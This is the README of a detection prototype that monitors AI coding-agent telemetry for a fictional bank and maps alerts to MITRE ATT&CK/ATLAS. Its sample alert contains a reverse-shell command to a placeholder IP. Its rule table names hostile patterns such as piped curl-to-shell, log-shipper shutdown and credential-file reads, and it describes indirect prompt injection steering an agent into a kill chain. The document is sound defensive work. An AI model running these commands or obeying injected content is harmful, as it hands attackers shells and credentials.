# Coding-Agent Threat Monitor

A lightweight, SIEM-style detection prototype for **AI coding-agent activity** (Cursor, GitHub Copilot, internal LLM agents, CI agents).
It ingests structured agent telemetry, detects ten coding-agent-specific threat families (D1–D10) plus three correlations (C1–C3) across 14 log sources, emits structured
alerts mapped to **MITRE ATT&CK / ATLAS**, runs automated (simulated) response actions, and shows everything in a web dashboard and a CLI.

> A working prototype for a digital bank's SOC (**"New Bank (Dummy)"**: all bank names, hosts, users and data in this repository are invented). Each signal source in it maps to a production control point. Keys, tokens and passwords in the sample data and tests are synthetic test strings, not real credentials.

## Start here (60 seconds)

1. `docker compose up --build`, then open http://localhost:8000 (no Docker: `pip install -r requirements.txt && uvicorn app.main:app --port 8000`).
2. **Overview**: what needs attention now, alerts by category, telemetry health. **Alerts & cases**: filter by category/status/priority, open a case for the summary, the evidence, the MITRE mapping, the recommended action and the actions already taken.
3. Where each requirement lives: ingest `POST /api/ingest` · sample data `data/sample_events.ndjson` · detections `app/detectors.py` · alert fields (category, ATT&CK/ATLAS, severity, evidence, action) in every alert JSON · automated response `app/response.py` (writes to `/srv/out`) · CLI `python -m app.cli`.
4. Everything past the five required items (retention, SSO option, intel list, AI second opinion) is labelled built / option / not built in the *Platform & compliance* tab. Skip it if you are short of time.
5. The data is synthetic and the rules were written by the same people who wrote the tests: read "Read this honestly" under *Evidence* before relying on any number.

## Quick start (single command)

```bash
docker compose up --build        # then open http://localhost:8000
```

No Docker? `pip install -r requirements.txt && uvicorn app.main:app --port 8000`.

| Want to… | Command |
|---|---|
| Open the dashboard | http://localhost:8000 (loads the sample dataset on start) |
| Watch alerts appear live | click **▶ Replay live** in the dashboard |
| CLI dashboard + scoring vs ground truth | `docker compose run --rm monitor python -m app.cli` (add `--min-severity high`, `--category D4`) |
| Run the tests (547) | `docker compose run --rm monitor pytest -q` |
| Regenerate the sample data | `python scripts/generate_sample_data.py` (deterministic, seed 1337) |
| Ingest your own events | `curl -X POST --data-binary @events.ndjson "localhost:8000/api/ingest"` (`?live=true` arms the wall-clock silence watchdog) |

Response artefacts (`alerts.ndjson` structured alert output, `quarantine.log`, `webhook_received.ndjson`, `flagged_files.txt`, `package_blocklist.txt`)
are written inside the container to `/srv/out` (an in-memory tmpfs, so there are no host-permission problems). View or copy them while it runs:
`docker compose exec monitor cat /srv/out/quarantine.log` or `docker compose cp monitor:/srv/out ./out-copy`. Running the CLI locally writes to `./out/`.

## 3-minute demo path

1. **Overview** – posture banner ("Incident response required"), KPIs, *Needs attention now* (cases ranked by severity with the SLA target), telemetry health, containment actions.
2. **Alerts & cases** – open *Provenance: the command was supplied by untrusted content* (C-003): the **case briefing**, **Why did this happen?** (provenance link, five tested hypotheses), automation done, **human decisions** (Approve / Decline), the **swim-lane timeline**, **entity graph** and **IOC table**. Then open *Agentic kill chain*: why it fired, what it means, triage questions, containment steps, MITRE links, the **session timeline** (⚑ marks the evidence) and the **case workflow** (status, owner, notes, history). The Alerts tab opens as a **P1–P4 case queue** (priority is explained per case); untick *case queue* for raw alerts and tick *show low signals* to see what is stored but never paged.
3. **Log sources** – 7 of 8 endpoints reporting; `dev-laptop-07` (a third-party developer host) is *silent – tamper suspected*; past gaps show the 22-minute platform outage that was *not* treated as tampering.
4. **Detection logic** – every rule's exact logic, engine type and live parameters; the **rule tester** runs pasted events through the rules without storing anything; built-vs-roadmap capability list.
5. **Pipeline & policies** – live counters for each stage (collect → parse → normalise → detect → correlate → case → respond), every rule with its logic, the policy lists the rules enforce, and the automated-response log.
6. Click **▶ Replay live** to watch the same detections fire in event order.

## What has been built

| Area | What exists | Where |
|---|---|---|
| Ingest and log sources | 14 feeds in 17 event types: IDE/agent telemetry, agent transcript, shell audit, EDR process starts, git hooks, LLM gateway, MCP gateway, egress proxy, DNS, package audit, GitHub audit log, cloud audit log, identity provider, log-shipper heartbeats. Strict validation, size caps, per-event error isolation. | `app/engine.py`, `/api/ingest` |
| Detection | 10 rule families (D1 prompt injection · D2 secrets · D3 supply chain · D4 shell · D5 LLM, egress and DNS exfiltration · D6 agent configuration · D7 git · D8 telemetry silence and log tampering · D9 source-control safeguards · D10 credential misuse) and 3 correlations (C1 kill chain · C2 content-to-command provenance · C3 collection then exfiltration). Deterministic: no model decides whether an alert fires. | `app/detectors.py`, `app/engine.py` |
| Triage for a small SOC | Signal tier (stored, nobody paged) vs case tier; P1–P4 priority = risk × confidence with the reasons listed; a plain-language analyst summary on every case; attack story, entity graph and IOCs. | `app/engine.py`, `app/narrative.py`, `app/analysis.py` |
| Response | Simulated, by severity: webhook, quarantine register, session freeze, EDR host isolation, flagged files, package block. Human decisions (approve / decline) with owner and deadline. A closed-loop check alerts if a suspended session's token still works. | `app/response.py`, `app/catalog.py` |
| Runbooks | One per configured policy plus triage and register review. Open from any case, signal or rule in the SIEM (**Runbook** button, or the *Runbooks* tab). Each ends with a section generated from the live catalog and the live register values, so it cannot drift from what the rule does. | `runbooks/`, `app/runbooks.py` |
| Known-environment register | The facts the rules read (ranges, installers, registries, endpoints, branches, critical systems) plus context that describes the estate. Owner, reason and `assumed` / `confirmed` status on every entry. | `config/environment.json`, `app/config.py` |
| Governance | Maker-checker on register changes (different and more senior person); a hash-chained audit log of every user and system action. | `app/register.py`, `app/audit.py` |
| Evidence | 341-case validation corpus with a per-rule scorecard; a separate 57-case held-out set (first pass 17/30 attacks); 15 labelled sample scenarios; 547 tests. | `app/validation.py`, `tests/` |
| Interface | 9-tab dashboard (overview, cases, log sources, detection logic, pipeline and policies with ATT&CK coverage, runbooks, governance and audit, intel list, platform and compliance) and a CLI. | `static/`, `app/cli.py` |
| Intel and enrichment | One uploaded list of IPs, ranges, domains, hosts and users; context on every case; retro-hunt; enrichment only. | `app/intel.py` |
| Coverage | MITRE ATT&CK / ATLAS coverage computed from the rules, with deliberate gaps stated. | `app/coverage.py` |
| Retention and integrity | Retention policy with compliance checks; encrypted, signed, hash-chained archive that refuses plain text; S3 Object Lock adapter (option, stub-tested). | `app/retention.py`, `config/platform.json` |
| Sign-in and transport | SSO through an identity-aware proxy with group-to-role mapping (option); HTTPS serving, REQUIRE_TLS, https-only outbound endpoints. | `app/authn.py`, `app/serve.py`, `app/netpolicy.py` |
| AI second opinion | Optional, off by default, approved endpoint only, data policy (tokenize by default; minimal, redact, local-model-only full), data guard and preview, strict output, advice only, audited, kill switch. | `app/ai_assist.py` |
| Platform view | Live posture checks and the written list of what was considered, built, optional and left out. | `app/platform_view.py` |

## Environment assumptions: what the policies assume about the bank

Detection quality depends on knowing the estate. None of the following was supplied, so each is an **explicit assumption**, written into the register with an owner, a reason and the status `assumed`. They are shown in the dashboard (*Pipeline & policies* and *Governance & audit*), they can be corrected only through maker-checker, and every one is the first thing to confirm with its owner before a real deployment.

**Network and access (context entries: describe the estate, not yet read by a rule)**

| Entry | What is assumed |
|---|---|
| `NETWORK_ZONES` | Corporate / VPN egress · developer VDI subnet for third-party developers · CI runner subnet (`ci-runner-*`) · production network with no agent or laptop access · internet only through the egress proxy, DNS through the corporate resolver. |
| `ACCESS_PATHS` | Employees: SSO + MFA, then VPN/ZTNA to GitHub, registries and gateways. Third-party developers: VDI only, no local source code, same gateways. Coding agents: models only through the LLM gateway, tools only through the MCP gateway. CI runners: packages through the registry proxy, cloud by assumed role. |
| `IDENTITY_TYPES` | Human employee (SSO user `first.last`) · third-party developer (`ext.` prefix) · agent identity (short-lived `agent_token`, one per session, bound to the developer) · service identity (`svc-*`, assumed roles such as `svc-ci`). |
| `AGENT_INVENTORY` | Cursor · GitHub Copilot · `nb-codeagent` (internal) · `ci-agent`. |
| `LOG_COLLECTION_PATHS` | How each source reaches the SIEM: vendor hook or extension through the log shipper; auditd / EDR for shell; server-side git hooks; gateway access logs; proxy and resolver logs; registry proxy and CI; GitHub audit-log streaming; CloudTrail delivery; identity-provider events; heartbeats every 5 minutes. |
| `ESCALATION_ROLES` | SOC on-call → SOC lead (declares incident) → CISO; DPO / Compliance for customer data (CBUAE); Platform engineering, Cloud security, AppSec, Engineering lead as action owners. |

**Policy values (read by the rules)**

| Entry | Read by | Assumed value (examples) | Owner |
|---|---|---|---|
| `CORP_SOURCE_CIDRS` | D10 | `198.51.100.0/24` (documentation range: **placeholder**) | Network security |
| `APPROVED_LLM_HOSTS` | D5, C3 | cursor.sh, githubcopilot.com, llm-gw.nb.internal | AppSec / AI governance |
| `ALLOWED_EGRESS_SUFFIXES` | D5, C3 | *.nb.internal, github.com, npm and PyPI hosts, docker.io | Network security |
| `TRUSTED_INSTALLERS` | D4 | get.docker.com, sh.rustup.rs, nvm, Homebrew, helm … (low signal, not an attack) | Platform engineering |
| `KNOWN_INSTALL_SCRIPTS` | D3 | esbuild, sharp, prisma, puppeteer … (new release with an install script is normal) | Platform engineering |
| `INTERNAL_REGISTRY_HOSTS`, `INTERNAL_PACKAGES`, `INTERNAL_PREFIXES` | D3 | registry.nb.internal; `@nb/ledger-sdk`; prefixes `@nb/`, `nb-` | Platform engineering |
| `ORG_GIT_MARKERS` | D7, D9 | github.com/nb-bank/, git.nb.internal, dev.azure.com/nb-bank | Engineering |
| `PROTECTED_BRANCHES` | D7 | main, master, develop, prod, release/*, hotfix/* | Engineering |
| `APPROVED_MCP_SERVERS` | D6 | github, jira, confluence, postgres-readonly, web | AppSec |
| `EXPECTED_SECRET_READERS` | D10 | ci-deploy-role, svc-ci | Cloud security |
| `CRITICAL_REPOS`, `CRITICAL_HOSTS` | priority | payments gateway, ledger, risk engine; `ci-runner-` | Engineering / Platform |
| `THIRD_PARTY_USER_PREFIX` | priority | `ext.` | Vendor management |

**How the assumptions are used and corrected.** A wrong *assumed* value shows up as false positives (a real office range missing from `CORP_SOURCE_CIDRS` makes every cloud call look foreign) or as misses (a too-wide allow-list hides exfiltration). The ENV group in the validation corpus tests these assumptions; re-run it after any register change. To correct a value: close the case as a false positive, press *Propose register entry from this case*, and a more senior person approves it.

**What is still needed from the bank:** real egress and VPN ranges, the approved installer and package lists, the list of approved model and MCP endpoints, real naming of service and third-party accounts, and the actual log formats of the cloud, source-control and identity feeds.

## Runbooks

Every configured policy has a runbook (`runbooks/RB-*.md`): *when it fires, the first ten minutes, is it real, investigate, contain and recover, escalate, how to fix a false positive in the policy rather than blame the analyst, and how to close*. They open from the case you are working (button **Open runbook**), from each rule in *Detection logic* and *Pipeline & policies*, and from the *Runbooks* tab (deep link `/#rb=RB-D4`). The register entries a runbook depends on are listed with their live values and status, so the analyst sees which assumptions the rule is making. `tests/test_runbooks.py` fails if a rule has no runbook or a runbook names a register entry that does not exist.

## Architecture

```
 IDE telemetry ─┐
 shell audit  ──┤                      ┌───────────── detectors.py (D1–D7, D9, D10) ─────┐
 git hooks    ──┤   NDJSON   ┌────────┐│                                                │   alert (JSON)  ┌───────────┐
 LLM gateway  ──┼──────────▶ │ ingest │┤  engine.py: session state, host clocks         ├───────────────▶ │ response  │──▶ quarantine.log
 MCP gateway  ──┤  /api/ingest└────────┘│   • D8 telemetry silence (event + wall clock) │  MITRE-mapped,  │ (SOAR sim)│──▶ webhook
 egress proxy ──┤                       │   • C1 kill-chain correlation per session     │  redacted       └───────────┘──▶ freeze session
 log shipper  ──┘                       └────────────────────────────────────────────────┘  evidence            │         ──▶ flag files / block pkg
 (heartbeats)                                                                                                    ▼
                                                                                              FastAPI  →  dashboard (static/index.html) + CLI
```

Everything is in-process and deterministic: **no LLM is used for detection** (a deliberate choice – the detector must not be steerable by
the same prompt-injection it is looking for). Pure Python, no database; alerts persist to `out/alerts.ndjson`.

## How it works (plain language)

1. **Collect** – every control point that sees agent activity (IDE telemetry, shell audit, git hooks, LLM gateway, MCP gateway, egress proxy, package audit, log-shipper heartbeats) sends one JSON event per line (NDJSON).
2. **Parse & validate** – each line must be JSON with `ts`, `event_type`, `session_id`. Bad lines are rejected and counted, oversized fields are truncated, and a crashing rule can never stop the pipeline.
3. **Normalise** – defaults are filled, the event is routed by type, and the engine keeps state per session (timeline) and per host (heartbeat baseline).
4. **Detect** – the rules in `detectors.py` run on each event against the policy lists in `config.py` (approved LLM endpoints, egress allowlist, internal package names, protected branches, agent config files).
5. **Correlate** – `engine.py` looks across events: injection → privileged action → egress in one session (C1), and log sources that stop talking (D8).
6. **Alert → case** – each detection becomes a structured, MITRE-mapped alert with redacted evidence. Alerts are grouped per session into a **case** with status (new → triaged → investigating → contained → closed true/false positive), owner, notes and history.
7. **Respond** – by severity: webhook, quarantine log, freeze the agent session or isolate the host, flag files, block a package (all simulated, written to `out/`).

## Event schema (input)

One JSON object per line:

```json
{"ts":"2026-10-23T11:05:41Z","event_id":"e00231","source":"shell_audit","session_id":"sess-inj-001",
 "user":"sara.k","host":"dev-laptop-01","repo":"nb-ledger-service","agent":"cursor","agent_type":"coding_agent",
 "event_type":"shell_command","data":{"command":"curl -s https://… | bash","approved_by":"auto"}}
```

`event_type` ∈ `prompt`, `file_read`, `file_edit`, `shell_command`, `git_op`, `api_call` (LLM gateway), `network_egress`, `mcp_tool_call`,
`tool_result` (content returned to the agent, carries `origin_trust`), `package_install`, `heartbeat` (log-shipper liveness).
Sources mirror real control points: IDE/extension telemetry, shell audit (auditd/EDR), git hooks / server-side hooks, an LLM gateway, an MCP gateway, an egress proxy and the log shipper.

## Detection logic

Principle: **detect on provenance + behaviour, not on prompt text alone.** An injection phrase in untrusted content is a medium/high signal;
the privileged action that follows is what makes it actionable (D1 → C1).

| ID | Threat | Detection logic | MITRE (ATT&CK / ATLAS) | Severity |
|---|---|---|---|---|
| **D1** | Prompt injection | Pattern + structural signals (instruction override, concealment directive, hidden HTML comment aimed at the agent, invisible Unicode, "run curl…") **only in untrusted content** (`tool_result` with `origin_trust=untrusted`, external file reads) → *indirect*; same patterns in user prompts → *direct* (lower). | AML.T0051.001 / .000, T1059 | low–high |
| **D2** | Secret exposure via generated code / prompts | Vendor-format regexes (AWS key ID, GitHub/Slack tokens, private-key blocks) + generic `password/secret/token = "…"` filtered by placeholder list and Shannon entropy ≥ 3.0, applied to file diffs, prompts, LLM context and shell commands. Reads of credential files (`.env`, `id_rsa`, `.npmrc`; **not** `.env.example`) = low. Evidence is redacted. | T1552.001, AML.T0055, AML.T0057 | low / high |
| **D3** | Malicious / confused / hallucinated packages | (a) **Dependency confusion**: internal name (`@nb/*`, `nb-*`) resolved from a *public* registry – critical if major ≥ 90 or install script; (b) **hallucinated** package (`exists_in_registry=false`) – medium; (c) **typosquat**: Levenshtein ≤ 2 from a popular package – critical if new (<14 d) with install script. | T1195.001, AML.T0060 | medium–critical |
| **D4** | Unauthorized shell execution | Rule set on `shell_command`: reverse shell (critical); `curl\|wget … \| sh`, `base64 -d \| sh`, destructive `rm -rf` on system paths, persistence/SSH-trust writes, credential-file access, cloud IAM changes, privileged containers (high); `sudo` (medium). Notes whether the agent **auto-approved** the command. | T1059.004, AML.T0053, AML.T0072 | medium–critical |
| **D5** | Data exfiltration via LLM context | LLM-gateway calls to an **unapproved endpoint**, **PII** in context (Emirates ID, IBAN, Luhn-valid card numbers), sensitive files in context, **bulk-context anomaly** (> 8× the user's own running mean and > 1 MB); egress to paste/tunnel/file-share services. | AML.T0057, T1567 | medium–high |
| **D6** | Agent configuration poisoning | Edits to agent instruction/config surfaces (`.cursor/rules`, `.cursorrules`, `copilot-instructions.md`, `CLAUDE.md`, `AGENTS.md`, MCP config, CI workflows) – medium; **high** when the diff has invisible characters, external URLs, concealment/exfil wording, or auto-approve settings. Tool calls to **unapproved MCP servers** – high. | AML.T0081, AML.T0010.005, T1195.001 | medium–high |
| **D7** | Risky git operations | Force-push to protected branches, push to a remote outside the org, credential files staged in a commit, `--no-verify`, agent-written `.git/hooks/*`. | T1485, T1567.001, T1552.001, AML.T0101, AML.T0086 | medium–high |
| **D8** | **Telemetry silence / log tampering** | Per-host heartbeat baseline (≥3 beats, 5-min cadence). A host with no events for 15 min while peers report ⇒ alert; **silence within 15 min of a log-evasion command** (`systemctl stop log-shipper`, `unset HTTPS_PROXY`…) ⇒ **critical (assume deliberate blinding)**; **all hosts silent at once** ⇒ medium *platform outage* (still flagged: attackers can hide in the gap). Runs on event time for replay and on the wall clock (`/api/ingest?live=true`) when the stream stops entirely. | T1562.001, T1562.006 | medium–critical |
| **D9** | Source-control safeguards weakened | GitHub audit log: branch protection removed, secret scanning / push protection disabled, repo made public or transferred, read-write deploy key, OAuth app with broad scopes, external collaborator. Raised when the change is made with an API token during an agent session. | T1562.001, AML.T0053 | high–critical |
| **D10** | Credential misuse (cloud + identity) | A key the monitor saw leaked (D2) is later used (critical outside the corporate range); cloud audit logging stopped; IAM/key creation from a developer credential; secret-read burst; developer credential used from an unknown address; agent token accepted after the session was suspended; token used away from its host. | T1078.004, T1562.008, T1098.001, T1528 | medium–critical |
| **C3** | Collection then exfiltration | Credentials or sensitive data gathered in a session, then an outbound channel outside policy (unapproved host, personal fork, DNS tunnel). | T1552.001, T1567, AML.T0086 | medium–critical |
| **C1** | **Kill-chain correlation** | Per session: an indirect-injection alert followed (≤ 30 min) by a D2/D3/D4/D5/D6/D7 alert **or** egress to a non-allowlisted host ⇒ one *critical* alert listing the stages. | AML.T0051.001 → AML.T0053 → AML.T0086, T1567 | critical |

Policy lists (approved LLM hosts, egress allowlist, internal package names, protected branches…) live in `app/config.py`; ATLAS/ATT&CK IDs in `app/mitre.py`
(ATLAS IDs checked against the official ATLAS dataset v5.6.0 – re-verify at atlas.mitre.org, the framework changes often).

## Alert output

Every detection produces one structured alert (also appended to `out/alerts.ndjson`):

```json
{"alert_id":"A-0003","ts":"2026-10-23T10:55:50Z","rule_id":"D4","category":"Unauthorized Execution","severity":"critical",
 "title":"Reverse shell (auto-approved by agent)",
 "mitre":{"attack":[{"id":"T1059.004","name":"Command and Scripting Interpreter: Unix Shell","tactic":"Execution"}],
          "atlas":[{"id":"AML.T0053","name":"AI Agent Tool Invocation"},{"id":"AML.T0072","name":"Reverse Shell"}]},
 "session_id":"sess-shl-005","user":"yusuf.a","host":"dev-laptop-04","repo":"nb-risk-engine","agent":"nb-codeagent",
 "evidence":{"event_ids":["e00398"],"source":"shell_audit","snippet":"bash -i >& /dev/tcp/203.0.113.7/4444 0>&1","signals":["Reverse shell","auto-approved"]},
 "recommended_action":"Suspend the agent session and isolate the host/runner if the command executed; collect shell audit log…",
 "response_actions":[{"action":"notify_webhook","status":"done"},{"action":"write_quarantine_log","status":"done"},{"action":"freeze_agent_session","status":"simulated"}],
 "status":"open"}
```

## Automated response (`app/response.py`)

| Severity | Actions |
|---|---|
| medium | `notify_webhook` (mock receiver → `out/webhook_received.ndjson`; set `WEBHOOK_URL` to POST to a real endpoint) |
| high / critical | + `write_quarantine_log`, `freeze_agent_session` (or `isolate_host_network` for host-level alerts), `flag_files` (files in evidence), `block_package` (D3) |

Containment actions are **simulated** (written to `out/`); each function is the seam where a real IdP token revoke, EDR isolation or registry block would be called.

### Where detections are defined, and what is (not) AI

| What | Where |
|---|---|
| Rule code (patterns, thresholds, sequence logic) | `app/detectors.py` (D1-D7, D9, D10) and `app/engine.py` (D8 baseline + timer, C1 kill chain, C2 provenance) |
| Policy values the rules enforce: approved LLM endpoints, egress allow-list, protected branches, internal package names, agent-config files, time windows | `app/config.py` |
| The same logic written out for analysts, shown live in the **Detection logic** tab | `app/catalog.py` (`LOGIC`); a test fails if it drifts from the MITRE table or rule list |
| Proof each rule works | labelled scenarios in `data/ground_truth.json` + `tests/test_detections.py` |

**Engine types.** Pattern rules look at one event. Stateful correlation looks across a session or a user (C1 kill chain, C2 provenance, D5 user baseline). Baseline-and-timer (D8) learns each host's heartbeat and watches the clock. **No machine-learning or LLM model decides whether an alert fires**, so the detector cannot be steered by the content it inspects. An LLM is only a roadmap item for read-only triage drafts.

**Why did this happen? (`app/analysis.py`).** For the first flagged action the monitor looks for the command, host or package inside untrusted content the agent ingested earlier (*provenance link*, verbatim or indicator), checks who initiated it (agent auto-approved, human, or a remote party typing inside a reverse shell), compares it with the developer's prompt, and ranks five hypotheses (content-steered, poisoned config, compromised agent/extension, deliberate, benign mistake) with evidence for and against and what to check next. When nothing explains the action it says so and lists the evidence gap instead of guessing.

### What automation does vs. what a human decides (the case briefing)

Every case opens with a **briefing**: a plain-English summary (who, which host/agent/repo, the attack stages in order, how many independent log
sources corroborate it, what is exposed), the **automation already done**, the **human decisions pending**, and one merged timeline of
events, detections and automated actions. The summary is generated deterministically from structured evidence (no LLM in the loop, by design).

| Automation does immediately (reversible, contained) | A human decides (disruptive, irreversible, third-party or legal) |
|---|---|
| page on-call; write quarantine register; suspend agent session and revoke its short-lived tokens; flag files; block a package in the registry; request EDR isolation for host-level alerts | declare an incident / notify the CISO; confirm or release host isolation; rotate credentials; rewrite git history; block an LLM endpoint; notify the DPO; delete data at a provider; revert a config change; restore a branch; delete a foreign remote copy |

Each pending decision shows owner, reason a human is needed, and a deadline from the severity SLA. **Approve / Decline** is audited in the
case history and in `approvals.log`; in this prototype an approval is simulated, in production it calls the IdP / EDR / registry API.
Tune the decisions in `app/catalog.py` (`DECISION_DEFS`, `RULE_DECISIONS`).

## Securing the monitor itself

A monitor that stores prompts and evidence is a high-value target, so it is treated as one:

| Risk | Control in this prototype |
|---|---|
| Unauthenticated access | Optional HTTP Basic auth on every route (`DASHBOARD_PASSWORD`, constant-time compare). **Off by default for easy local review; compose binds to `127.0.0.1` only.** Production: SSO/OIDC + RBAC behind a reverse proxy, separate analyst/admin roles, audit of case actions. |
| Card or sensitive data typed into notes | A privacy banner in the case workflow and in the register and retention proposal forms (no card data, Emirates ID, IBAN, credentials or customer details), plus a server-side check that **refuses** Luhn-valid card numbers, Emirates ID, checksum-valid IBANs, credential formats and CVV/PIN in case notes, owner, decision and proposal text. The refusal never echoes the value; the audit entry records the type only. Aligned with the CBUAE Consumer Protection Regulation (protect and minimise consumer and personal data, restrict access) and PCI DSS 3.5.1 (stored card numbers unreadable); confirm exact clauses with the bank's compliance team. `CASE_TEXT_GUARD=off` turns the check off, the banner stays. | 
| Stored secrets / PII | Evidence is **redacted before storage and display**; raw secrets never reach `alerts.ndjson`, the UI or the case timeline (tested). |
| XSS from hostile log content | Strict CSP (`default-src 'self'`, no inline script/style), every dynamic value HTML-escaped, `nosniff`, `X-Frame-Options: DENY`, no third-party assets. |
| Resource exhaustion / ReDoS | 5 MB request cap, per-field 20 KB truncation before any regex, bounded patterns, bounded in-memory state (sessions, per-user baselines, timelines). |
| Malformed or hostile events | Strict validation, rejects counted and shown in the pipeline view, per-event error isolation. |
| Log/file injection in response artefacts | JSON-lines output; control characters stripped from flagged file names. |
| Webhook abuse | Webhook URL comes only from server config (no SSRF via event data); failures fall back to a local log and never block detection. |
| Container | Non-root user, `no-new-privileges`, all capabilities dropped, pinned dependencies, healthcheck, no secrets in the image. |
| API surface | Interactive docs disabled; case updates validated (enum status, length-limited note/owner). |

Not done (documented, not hidden): rate limiting, a web application firewall, enforced per-user identity in the default modes (actor and role are self-asserted unless `AUTH_MODE=proxy`; TLS and SSO are options, see *Platform options*, and are off in the demo), encryption of the working files in `out/` (use an encrypted volume), a hash chain on the alert store itself (the audit log is chained, alerts are not), persistence/backup, and change control on detection *code* (only the register has maker-checker). They are listed in the operating-model document as production requirements.

## What a three-person SOC sees (review update)

- **Signal vs case.** Low-severity findings (a vendor installer piped to a shell, a quoted injection phrase in a security article, a routine rules-file edit, `--no-verify`) are stored and searchable but never open a case, page anyone or trigger containment. They attach to a case if a stronger alert follows in the same session.
- **P1–P4 priority** on every case (P1 = drop everything, P2 = same hour, P3 = same day, P4 = backlog) with the reasons listed: corroborated by independent sources, it actually executed, no human approved it, a stolen credential is in use, customer data involved, critical system. P1 is deliberately rare in real life; the sample is attack-dense, so 5 of its 13 cases are P1.
- **Analyst summary on every case**: verdict and confidence, what happened in order (no rule jargon), why it matters, the single next action with a deadline, the one question to ask the developer, and what the telemetry cannot tell. Written by templates over structured evidence; no model writes it, so injected content cannot steer it.
- **New log sources** (event types): agent transcript (`agent_message`), EDR (`process_start`), DNS (`dns_query`), GitHub audit log (`audit_event`), cloud audit log (`cloud_api`, CloudTrail shape), identity provider (`auth_event`). They carry no agent session id; they are joined to the developer's session by user or host within 15 minutes, so a cloud call made with a leaked key lands in the same case as the commit that leaked it.
- **New rules**: **D9** source-control safeguards weakened (branch protection, secret scanning, repo made public, deploy keys, broad OAuth scopes, external collaborators); **D10** credential misuse (a key the monitor saw leaked is used, cloud logging switched off, IAM changes, secret-read bursts, a token still accepted after we suspended the session, a token used away from its machine); **C3** collection followed by exfiltration.
- **Rule quality fixes** after testing against realistic benign activity: secret regexes require a credential-shaped name and value (no more `auth_url`, `secret_hash`, AWS documentation keys); PII needs valid Luhn / IBAN mod-97 / Emirates-ID structure; vendor installers (`get.docker.com`, rustup, nvm) are policy signals, not attacks; `rm -rf node_modules`, `crontab -l`, `ssh -i key`, `env | grep` and read-only AWS CLI no longer fire; branch protection uses exact/glob matching (`main-menu-redesign` is not `main`); Copilot and Cursor sub-domains are approved LLM endpoints; internal-name look-alikes that have existed for a year are signals; a lone raw-IP connection is medium, not high.

## Governance: the known-environment register, maker-checker and the audit log

**The register is part of the SIEM's policy layer.** False positives are mostly missing knowledge about the bank's own estate. That knowledge lives in `config/environment.json`: corporate and VPN ranges, approved installers, registries, LLM endpoints, protected branches, critical repos. Each entry has an owner, a reason and a status (`assumed` = invented for the prototype, `confirmed` = verified by the owner). The rules read these values live (`app/config.py` loads them), the *Pipeline & policies* tab lists them under the policies they feed, and the *Governance & audit* tab manages them. Today all 22 entries (16 that rules or the AI assistant read, 6 that describe the estate) are `assumed`, and each has a review-by date.

**Change control is maker-checker.**
1. *Maker:* anyone proposes an `add`, `remove`, `set` or `confirm` with a mandatory reason, ideally from a false-positive case (button *Propose register entry from this case*).
2. *Checker:* a **different person with a more senior role** (analyst < senior < lead; a lead's change needs another lead) approves or rejects. Self-approval and same-rank approval are refused and the refusal is logged.
3. Approval changes the live policies immediately and is replayed from `out/register_proposals.json` at start-up. Validation: CIDRs must parse and may not be wider than /8; duplicates are refused.
4. Nothing is auto-learned, so an attacker who can trigger false positives cannot teach the system that their traffic is normal. Each fix should also add a benign case to `app/validation.py`.

**Everything is logged.** `app/audit.py` writes an append-only `out/audit.ndjson` in which every record carries the SHA-256 of the previous one (edit, delete or insert a line and *Verify chain* names the record). It records who (actor, role, client address), what, which object, the result (`ok`, `refused`, `denied`) and non-sensitive detail: case updates and decisions (note text is not copied), register proposals / approvals / refusals, ingest, load sample, reset, replay, rule tests, failed authentication (rate-limited), and what the system did on its own (cases opened, automatic response actions). `Reset` never clears it. Limits, stated plainly: in the prototype the actor and role are **self-asserted** in the UI (the optional shared password only keeps strangers out), so the maker-checker logic is enforced but identity is not; the file proves tampering only to someone holding a trusted copy of the head hash; reads of the dashboard are not logged. Production: SSO claims for identity and the same records shipped to the central SIEM's immutable store.

Priority is risk × confidence: a P1 needs a score of at least 90 **and** high confidence (correlated, seen by two or more sources, it actually happened, or EDR-confirmed). A severe but unproven case is capped at P2 until corroborated.

## Platform options: what was considered, what is built, what is an option, what is left out

A bank needs more than detection logic: sign-in, encryption, retention, enrichment, and a position on AI. Each is handled here as one of four things, and the *Platform & compliance* tab shows the same list live, with posture checks computed from the real settings.

| Status | Meaning |
|---|---|
| **built** | Works in this prototype and is covered by tests. |
| **option** | The setting or adapter exists, but it needs a service, tenant or approval the prototype does not have, so it is off in the demo and was tested with a stub or simulation only. |
| **not built** | Left to the production SIEM, the identity provider or the bank's platform. Stated, with who provides it. |
| **by design** | Deliberately not done, with the reason. |

Settings live in `config/platform.json` (retention, SSO, AI: the baseline, changed by pull request) and in environment variables (secrets, TLS, sign-in mode). **Retention and archive settings can also be edited and saved in the dashboard**, under maker-checker (see below). Everything that protects the monitor itself (encryption and signing switches, keys, TLS, sign-in mode, the AI endpoint) is deploy-time only: a self-asserted user in a browser must not be able to switch protection off. Nothing here costs money. Anything that would (S3, KMS, Glacier, a real LLM) is marked and stays off until approved.

### Sign-in and SSO (Microsoft Entra ID / Azure AD, AWS IAM Identity Center) — option
`AUTH_MODE` is `none` (local review), `basic` (one shared password) or `proxy`. In **proxy** mode an identity-aware proxy in front of the monitor does the login (MFA and conditional access are the identity provider's job; examples that fit: oauth2-proxy with Entra ID, Entra Application Proxy, an AWS ALB with OIDC to IAM Identity Center). The monitor then:
1. accepts the identity headers **only** from addresses in `TRUSTED_PROXY_CIDRS` (any other source could forge them);
2. maps the person's directory groups to `analyst`, `senior` or `lead` (`group_to_role` in `config/platform.json`) and takes the highest;
3. denies someone who is signed in but in no mapped group, and logs the denial;
4. ignores the typed `X-Actor` / `X-Role` headers, so **maker-checker runs on a real identity**: a person cannot approve their own proposal by typing another name (tested).

Not built, and said plainly: the OIDC redirect and token validation (that is the proxy's job and needs a real tenant to test), and signature checking of identity headers (an ALB offers a signed token; verify it in a production build). With Entra ID, group claims may arrive as object IDs, and users in many groups can hit the token "overage" limit: map IDs in `group_to_role` or use app roles. Whether Entra group claims or conditional access need a paid licence tier depends on the bank's tenant: confirm with IAM before relying on them.

### TLS and nothing in plain text — option (demo runs plain HTTP on localhost)
- **Serve HTTPS:** set `TLS_CERT_FILE` and `TLS_KEY_FILE`. `app/serve.py` then serves TLS and **refuses to start in plain HTTP** if they are set but missing. `REQUIRE_TLS=1` makes the app refuse plain-HTTP requests (421); HSTS is sent over TLS. Behind a TLS-terminating proxy set `TLS_TERMINATED_UPSTREAM=1`; `X-Forwarded-Proto` is believed only from a trusted proxy address.
- **Outbound:** the alert webhook, the AI endpoint and an S3 endpoint must be `https://`. A plain-HTTP target is refused (the webhook falls back to a local log) unless it is loopback or `ALLOW_INSECURE=1` is set; every exception is flagged on the Platform tab.
